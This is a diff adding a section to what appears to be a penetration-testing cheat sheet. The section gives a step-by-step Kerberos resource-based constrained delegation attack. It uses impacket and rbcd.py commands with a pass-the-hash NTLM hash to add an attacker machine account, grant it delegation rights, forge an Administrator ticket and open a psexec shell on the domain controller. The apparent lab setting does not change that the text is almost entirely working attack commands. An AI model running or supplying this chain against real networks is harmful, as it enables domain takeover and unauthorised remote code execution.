@@ -1558,3 +1558,36 @@ log sekurlsa.log
 lsadump::sam
 ```
 
+
+
+#### Kerberos Resource-Based Constrained Delegation
+
+Add new machine to domain
+
+```shell-session
+impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+```
+
+Set delegation rights to impersonate administrator using [rcbd-attack.](https://github.com/tothi/rbcd-attack/tree/master)
+
+```shell-session
+python3 rbcd.py -dc-ip 192.168.x.x -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
+```
+
+Obtain a ticket by impersonating Administrator
+
+```shell-session
+impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.x.x
+```
+
+Save ticket locally
+
+```shell-session
+export KRB5CCNAME=./Administrator.ccache
+```
+
+Login with saved ticket - psexec
+
+```shell-session
+impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
+```
